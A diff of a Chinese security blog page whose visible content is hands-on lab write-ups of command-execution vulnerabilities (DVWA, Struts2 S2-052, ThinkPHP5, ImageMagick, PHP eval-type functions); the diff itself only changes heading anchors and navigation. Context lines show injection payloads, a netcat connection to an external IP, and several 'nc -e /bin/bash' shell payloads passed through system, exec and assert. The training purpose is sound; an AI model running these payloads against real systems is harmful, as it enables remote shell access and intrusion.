@@ -268,7 +268,7 @@
         <p>本文主要描述了：（1）一些软件出现的命令执行漏洞（包括dvwa,struts,thinkphp,ImageMagick)（2）可能出现命令执行漏洞的<strong>PHP代码执行函数</strong>分析。（3）能执行系统命令的<strong>系统命令执行函数</strong>分析</p>
 <a id="more"></a>
 
-<h2><span id="1-命令执行漏洞">1. 命令执行漏洞</span></h2><p>（1）实验介绍</p>
+<h2 id="1-命令执行漏洞"><a href="#1-命令执行漏洞" class="headerlink" title="1. 命令执行漏洞"></a>1. 命令执行漏洞</h2><p>（1）实验介绍</p>
 <p>实验链接： <a href="http://www.hetianlab.com/expc.do?ce=39594afc-5c80-4d51-8f99-7cb54e20b401" target="_blank" rel="noopener">http://www.hetianlab.com/expc.do?ce=39594afc-5c80-4d51-8f99-7cb54e20b401</a> </p>
 <p>实验来源：合天网安实验室</p>
 <p>实验目的： 通过实验理解命令实验漏洞的原理和利用方法。 </p>
@@ -310,7 +310,7 @@
 <figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span> &amp;;&amp; dir</span><br></pre></td></tr></table></figure>
 
 <p>所以medium存在问题是使用黑名单，且黑名单机制不全。</p>
-<h2><span id="2-cve-2017-9805struts2-052漏洞实验">2. CVE-2017-9805Struts2-052漏洞实验</span></h2><p>（1）实验介绍</p>
+<h2 id="2-CVE-2017-9805Struts2-052漏洞实验"><a href="#2-CVE-2017-9805Struts2-052漏洞实验" class="headerlink" title="2. CVE-2017-9805Struts2-052漏洞实验"></a>2. CVE-2017-9805Struts2-052漏洞实验</h2><p>（1）实验介绍</p>
 <p>实验链接：  <a href="http://www.hetianlab.com/expc.do?ce=c9b7ee13-33d3-4317-b31c-c9a80a8ad0a2" target="_blank" rel="noopener">http://www.hetianlab.com/expc.do?ce=c9b7ee13-33d3-4317-b31c-c9a80a8ad0a2</a> </p>
 <p>实验来源：合天网安实验室</p>
 <p>实验目的： 了解S2-052 Struts2远程命令执行漏洞危害；掌握检测利用S2-052 Struts2远程命令执行漏洞技术</p>
@@ -336,7 +336,7 @@
 <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&lt;command&gt;</span><span class="symbol">&lt;string&gt;</span>C:\Windows\System32\calc.<span class="keyword">exe</span>&lt;/<span class="built_in">string</span>&gt;&lt;/<span class="keyword">command</span>&gt;</span><br></pre></td></tr></table></figure>
 
 <p>被当作命令执行。</p>
-<h2><span id="3-thinkphp5-远程命令执行漏洞">3. Thinkphp5 远程命令执行漏洞</span></h2><p>（1）实验介绍</p>
+<h2 id="3-Thinkphp5-远程命令执行漏洞"><a href="#3-Thinkphp5-远程命令执行漏洞" class="headerlink" title="3. Thinkphp5 远程命令执行漏洞"></a>3. Thinkphp5 远程命令执行漏洞</h2><p>（1）实验介绍</p>
 <p>实验链接：   <a href="http://www.hetianlab.com/expc.do?ce=78d1b399-298f-420a-9445-97774c98369f" target="_blank" rel="noopener">http://www.hetianlab.com/expc.do?ce=78d1b399-298f-420a-9445-97774c98369f</a> </p>
 <p>实验来源：合天网安实验室</p>
 <p>实验目的： 通过该实验了解ThinkPHP5远程命令执行漏洞的原因和利用方法，以及如何修复该漏洞。 </p>
@@ -366,7 +366,7 @@
 <p>e.Module.php中用param获取实例化类对应的参数，然后通过invokeMethod函数动态调用方法。</p>
 <p>4）poc</p>
 <p>poc不懂。。。</p>
-<h2><span id="4-imagemagick漏洞">4. ImageMagick漏洞</span></h2><p>（1）实验介绍</p>
+<h2 id="4-ImageMagick漏洞"><a href="#4-ImageMagick漏洞" class="headerlink" title="4. ImageMagick漏洞"></a>4. ImageMagick漏洞</h2><p>（1）实验介绍</p>
 <p>实验链接：   <a href="http://www.hetianlab.com/expc.do?ce=78d1b399-298f-420a-9445-97774c98369f" target="_blank" rel="noopener">http://www.hetianlab.com/expc.do?ce=78d1b399-298f-420a-9445-97774c98369f</a> </p>
 <p>实验来源：合天网安实验室</p>
 <p>实验目的：掌握ImageMagick命令执行漏洞产生的原因、利用方法以及修复方法</p>
@@ -401,7 +401,7 @@
 <figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"wget"</span> -<span class="keyword">q</span> -O <span class="string">"%o"</span> <span class="string">"https:%M"</span></span><br></pre></td></tr></table></figure>
 
 <p>而%M为输入的图片的url地址。由于是简单的字符串拼接，所以可以将引号闭合后通过管道符引入其他命令，形成了命令注入。</p>
-<h2><span id="5web安全之命令执行漏洞理解">5.web安全之命令执行漏洞理解</span></h2><h3><span id="arce_ping">A.rce_ping</span></h3><p>（1）正常业务</p>
+<h2 id="5-web安全之命令执行漏洞理解"><a href="#5-web安全之命令执行漏洞理解" class="headerlink" title="5.web安全之命令执行漏洞理解"></a>5.web安全之命令执行漏洞理解</h2><h3 id="A-rce-ping"><a href="#A-rce-ping" class="headerlink" title="A.rce_ping"></a>A.rce_ping</h3><p>（1）正常业务</p>
 <figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span></span><br></pre></td></tr></table></figure>
 
 <p>有回显。</p>
@@ -442,7 +442,7 @@
 
 <p><img src="/assets/image-20200426174407176.png" alt="image-20200426174407176"></p>
 <p>反弹shell成功。</p>
-<h3><span id="brce_ping_2">B.rce_ping_2</span></h3><p>直接fuzz测试。</p>
+<h3 id="B-rce-ping-2"><a href="#B-rce-ping-2" class="headerlink" title="B.rce_ping_2"></a>B.rce_ping_2</h3><p>直接fuzz测试。</p>
 <p><img src="/assets/image-20200426174750306.png" alt="image-20200426174750306"></p>
 <p>发现<code>; &amp;&amp;</code>被过滤了。</p>
 <p>直接正向shell测试。</p>
@@ -453,12 +453,12 @@
 <figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc <span class="number">47.105</span><span class="number">.75</span><span class="number">.177</span> <span class="number">7778</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/assets/image-20200426175011326.png" alt="image-20200426175011326"></p>
-<h3><span id="crce_ping_3">c.rce_ping_3</span></h3><p>同样fuzz测试。</p>
+<h3 id="c-rce-ping-3"><a href="#c-rce-ping-3" class="headerlink" title="c.rce_ping_3"></a>c.rce_ping_3</h3><p>同样fuzz测试。</p>
 <p><img src="/assets/image-20200426175113764.png" alt="image-20200426175113764"></p>
 <p>发现过滤了<code>&amp; ;</code>同第三关一样的测试即可。</p>
-<h3><span id="drce_ping_4">D.rce_ping_4</span></h3><p>页面500</p>
-<h3><span id="ecode">E.code</span></h3><p>规定三种能力。（1）列出目录（2）写shell (3)反弹shell</p>
-<h4><span id="aarray_filter">a.array_filter</span></h4><p>array_filter函数原型array_filter ( array $array [, callable $callback [, int $flag = 0 ]] )</p>
+<h3 id="D-rce-ping-4"><a href="#D-rce-ping-4" class="headerlink" title="D.rce_ping_4"></a>D.rce_ping_4</h3><p>页面500</p>
+<h3 id="E-code"><a href="#E-code" class="headerlink" title="E.code"></a>E.code</h3><p>规定三种能力。（1）列出目录（2）写shell (3)反弹shell</p>
+<h4 id="a-array-filter"><a href="#a-array-filter" class="headerlink" title="a.array_filter"></a>a.array_filter</h4><p>array_filter函数原型array_filter ( array $array [, callable $callback [, int $flag = 0 ]] )</p>
 <p>（1）列出目录</p>
 <figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span>=<span class="title">system</span>&amp;<span class="title">cmd</span>=<span class="title">ls</span></span></span><br></pre></td></tr></table></figure>
 
@@ -474,21 +474,21 @@
 
 <p><img src="/assets/image-20200426181654848.png" alt="image-20200426181654848"></p>
 <p>反弹成功。</p>
-<h4><span id="b-array_map">b. array_map</span></h4><p>array_map原型</p>
+<h4 id="b-array-map"><a href="#b-array-map" class="headerlink" title="b. array_map"></a>b. array_map</h4><p>array_map原型</p>
 <figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_map ( callable $callback ,<span class="built_in"> array </span>$array1 [,<span class="built_in"> array </span>$... ] )</span><br></pre></td></tr></table></figure>
 
 <p>同样直接</p>
 <figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span>=<span class="title">exec</span>&amp;<span class="title">nc</span> -<span class="title">lvp</span> 7782 -<span class="title">e</span> /<span class="title">bin</span>/<span class="title">bash</span></span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/assets/image-20200426181922754.png" alt="image-20200426181922754"></p>
-<h4><span id="cassert">c.assert</span></h4><p>assert原型</p>
+<h4 id="c-assert"><a href="#c-assert" class="headerlink" title="c.assert"></a>c.assert</h4><p>assert原型</p>
 <figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert ( mixed $assertion [, <span class="built_in">string</span> $description ] )</span><br></pre></td></tr></table></figure>
 
 <p>payload:</p>
 <figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell<span class="constructor">_exec('<span class="params">nc</span> -<span class="params">lvp</span> 7783 -<span class="params">e</span> <span class="operator">/</span><span class="params">bin</span><span class="operator">/</span><span class="params">bash</span>')</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/assets/image-20200426182118419.png" alt="image-20200426182118419"></p>
-<h4><span id="dcall_user_func">d.call_user_func</span></h4><p>函数原型</p>
+<h4 id="d-call-user-func"><a href="#d-call-user-func" class="headerlink" title="d.call_user_func"></a>d.call_user_func</h4><p>函数原型</p>
 <figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func ( callable <span class="symbol">$</span>callback [, mixed <span class="symbol">$</span><span class="keyword">parameter</span> [, mixed <span class="comment">$... ]] )</span></span><br></pre></td></tr></table></figure>
 
 <p>列举目录下文件：</p>
@@ -498,12 +498,12 @@
 <figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span>=<span class="title">passthru</span>&amp;<span class="title">cmd</span>=<span class="title">nc</span> -<span class="title">lvp</span> 7784 -<span class="title">e</span> /<span class="title">bin</span>/<span class="title">bash</span></span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/assets/image-20200426182340785.png" alt="image-20200426182340785"></p>
-<h4><span id="ecreate_func">e.create_func</span></h4><p>create_function ( string $args , string $code )</p>
+<h4 id="e-create-func"><a href="#e-create-func" class="headerlink" title="e.create_func"></a>e.create_func</h4><p>create_function ( string $args , string $code )</p>
 <p>同样payload:</p>
 <figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span>=<span class="title">passthru</span>&amp;<span class="title">cmd</span>=<span class="title">nc</span> -<span class="title">lvp</span> 7785 -<span class="title">e</span> /<span class="title">bin</span>/<span class="title">bash</span></span></span><br></pre></td></tr></table></figure>
 
 <p>发现500了。。。。。。</p>
-<h4><span id="feval">f.eval</span></h4><p>eval ( string $code )</p>
+<h4 id="f-eval"><a href="#f-eval" class="headerlink" title="f.eval"></a>f.eval</h4><p>eval ( string $code )</p>
 <p>直接shell。</p>
 <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">system</span><span class="params">(<span class="string">'nc -lvp 31321 -e /bin/bash'</span>)</span></span></span><br></pre></td></tr></table></figure>
 
@@ -512,7 +512,7 @@
 
 <p><img src="/assets/image-20200426183223748.png" alt="image-20200426183223748"></p>
 <p>成功反弹shell。</p>
-<h4><span id="g-preg_replace">g preg_replace</span></h4><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, <span class="built_in">int</span> $limit = <span class="number">-1</span> [, <span class="built_in">int</span> &amp;$count ]] )</span><br></pre></td></tr></table></figure>
+<h4 id="g-preg-replace"><a href="#g-preg-replace" class="headerlink" title="g preg_replace"></a>g preg_replace</h4><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, <span class="built_in">int</span> $limit = <span class="number">-1</span> [, <span class="built_in">int</span> &amp;$count ]] )</span><br></pre></td></tr></table></figure>
 
 <p>直接cmd=phpinfo();</p>
 <p><img src="/assets/image-20200426183515204.png" alt="image-20200426183515204"></p>
@@ -520,7 +520,7 @@
 <figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system('nc -lvp <span class="number">3132</span>2 -e /bin/bash');</span><br></pre></td></tr></table></figure>
 
 <p><img src="/assets/image-20200426183623281.png" alt="image-20200426183623281"></p>
-<h4><span id="h-preg_replace2">h preg_replace2</span></h4><p>可以在双引号中使用</p>
+<h4 id="h-preg-replace2"><a href="#h-preg-replace2" class="headerlink" title="h preg_replace2"></a>h preg_replace2</h4><p>可以在双引号中使用</p>
 <figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$&#123;代码&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>来执行代码</p>
@@ -534,7 +534,7 @@
 
 
 
-<h3><span id="fsys">F.sys</span></h3><p>由于题目较多，所以只进行简单的测试。</p>
+<h3 id="F-sys"><a href="#F-sys" class="headerlink" title="F.sys"></a>F.sys</h3><p>由于题目较多，所以只进行简单的测试。</p>
 <ul>
 <li><p>com 500错误</p>
 </li>
@@ -555,7 +555,7 @@
 <li><p>system  ls  </p>
 </li>
 </ul>
-<h3><span id="gthinkphp-v5框架漏洞">G.ThinkPHP V5框架漏洞</span></h3><p>首先用dirsearch扫描，</p>
+<h3 id="G-ThinkPHP-V5框架漏洞"><a href="#G-ThinkPHP-V5框架漏洞" class="headerlink" title="G.ThinkPHP V5框架漏洞"></a>G.ThinkPHP V5框架漏洞</h3><p>首先用dirsearch扫描，</p>
 <p><img src="/assets/image-20200426185546367.png" alt="image-20200426185546367"></p>
 <p><img src="/assets/image-20200426185648640.png" alt="image-20200426185648640"></p>
 <p>发现个关键文件README.md，wget下载后发现是5.0版本的ThinkPHP.当然也可以随便输入文件报错看版本：v5.0.22.</p>
@@ -590,16 +590,16 @@
   <div class="popular-posts-header">相关文章</div>
   <ul class="popular-posts">
     <li class="popular-posts-item">
-      <div class="popular-posts-title"><a href="\web\合天培训_实验_sql注入\" rel="bookmark">合天培训_实验_sql注入</a></div>
-    </li>
-    <li class="popular-posts-item">
       <div class="popular-posts-title"><a href="\web\合天培训_实验_web安全之HTTP头部字段理解\" rel="bookmark">实验_web安全之HTTP头部字段理解</a></div>
     </li>
     <li class="popular-posts-item">
-      <div class="popular-posts-title"><a href="\web\合天培训_实验_文件包含漏洞\" rel="bookmark">实验-文件包含漏洞</a></div>
+      <div class="popular-posts-title"><a href="\web\合天培训_实验_文件上传考核\" rel="bookmark">合天培训_实验_上传文件考核</a></div>
     </li>
     <li class="popular-posts-item">
-      <div class="popular-posts-title"><a href="\web\合天培训_实验_文件上传考核\" rel="bookmark">合天培训_实验_上传文件考核</a></div>
+      <div class="popular-posts-title"><a href="\web\合天培训_实验_sql注入\" rel="bookmark">合天培训_实验_sql注入</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\web\合天培训_实验_文件包含漏洞\" rel="bookmark">实验-文件包含漏洞</a></div>
     </li>
   </ul>
 
@@ -681,7 +681,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#"><span class="nav-number">1.</span> <span class="nav-text">1. 命令执行漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#"><span class="nav-number">2.</span> <span class="nav-text">2. CVE-2017-9805Struts2-052漏洞实验</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#"><span class="nav-number">3.</span> <span class="nav-text">3. Thinkphp5 远程命令执行漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#"><span class="nav-number">4.</span> <span class="nav-text">4. ImageMagick漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#"><span class="nav-number">5.</span> <span class="nav-text">5.web安全之命令执行漏洞理解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#"><span class="nav-number">5.1.</span> <span class="nav-text">A.rce_ping</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#"><span class="nav-number">5.2.</span> <span class="nav-text">B.rce_ping_2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#"><span class="nav-number">5.3.</span> <span class="nav-text">c.rce_ping_3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#"><span class="nav-number">5.4.</span> <span class="nav-text">D.rce_ping_4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#"><span class="nav-number">5.5.</span> <span class="nav-text">E.code</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#"><span class="nav-number">5.5.1.</span> <span class="nav-text">a.array_filter</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#"><span class="nav-number">5.5.2.</span> <span class="nav-text">b. array_map</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#"><span class="nav-number">5.5.3.</span> <span class="nav-text">c.assert</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#"><span class="nav-number">5.5.4.</span> <span class="nav-text">d.call_user_func</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#"><span class="nav-number">5.5.5.</span> <span class="nav-text">e.create_func</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#"><span class="nav-number">5.5.6.</span> <span class="nav-text">f.eval</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#"><span class="nav-number">5.5.7.</span> <span class="nav-text">g preg_replace</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#"><span class="nav-number">5.5.8.</span> <span class="nav-text">h preg_replace2</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#"><span class="nav-number">5.6.</span> <span class="nav-text">F.sys</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#"><span class="nav-number">5.7.</span> <span class="nav-text">G.ThinkPHP V5框架漏洞</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-命令执行漏洞"><span class="nav-number">1.</span> <span class="nav-text">1. 命令执行漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-CVE-2017-9805Struts2-052漏洞实验"><span class="nav-number">2.</span> <span class="nav-text">2. CVE-2017-9805Struts2-052漏洞实验</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-Thinkphp5-远程命令执行漏洞"><span class="nav-number">3.</span> <span class="nav-text">3. Thinkphp5 远程命令执行漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-ImageMagick漏洞"><span class="nav-number">4.</span> <span class="nav-text">4. ImageMagick漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-web安全之命令执行漏洞理解"><span class="nav-number">5.</span> <span class="nav-text">5.web安全之命令执行漏洞理解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#A-rce-ping"><span class="nav-number">5.1.</span> <span class="nav-text">A.rce_ping</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#B-rce-ping-2"><span class="nav-number">5.2.</span> <span class="nav-text">B.rce_ping_2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#c-rce-ping-3"><span class="nav-number">5.3.</span> <span class="nav-text">c.rce_ping_3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#D-rce-ping-4"><span class="nav-number">5.4.</span> <span class="nav-text">D.rce_ping_4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#E-code"><span class="nav-number">5.5.</span> <span class="nav-text">E.code</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#a-array-filter"><span class="nav-number">5.5.1.</span> <span class="nav-text">a.array_filter</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#b-array-map"><span class="nav-number">5.5.2.</span> <span class="nav-text">b. array_map</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#c-assert"><span class="nav-number">5.5.3.</span> <span class="nav-text">c.assert</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#d-call-user-func"><span class="nav-number">5.5.4.</span> <span class="nav-text">d.call_user_func</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#e-create-func"><span class="nav-number">5.5.5.</span> <span class="nav-text">e.create_func</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#f-eval"><span class="nav-number">5.5.6.</span> <span class="nav-text">f.eval</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#g-preg-replace"><span class="nav-number">5.5.7.</span> <span class="nav-text">g preg_replace</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#h-preg-replace2"><span class="nav-number">5.5.8.</span> <span class="nav-text">h preg_replace2</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#F-sys"><span class="nav-number">5.6.</span> <span class="nav-text">F.sys</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#G-ThinkPHP-V5框架漏洞"><span class="nav-number">5.7.</span> <span class="nav-text">G.ThinkPHP V5框架漏洞</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
